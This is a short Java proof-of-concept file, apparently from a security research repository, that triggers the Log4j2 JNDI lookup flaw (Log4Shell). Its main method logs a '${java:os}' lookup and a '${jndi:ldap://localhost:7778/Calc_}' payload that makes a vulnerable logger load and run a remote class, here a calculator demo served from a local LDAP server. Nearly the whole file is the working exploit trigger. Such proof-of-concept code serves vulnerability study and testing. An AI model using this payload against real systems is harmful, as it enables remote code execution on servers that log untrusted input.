package com.wsh.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.wsh.unserialize.Method_u;

import java.util.function.LongFunction;

public class Log4j2Poc {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
        logger.error("hello {}","${java:os}");
        logger.error("hello {}","${jndi:ldap://localhost:7778/Calc_}");
    }
}
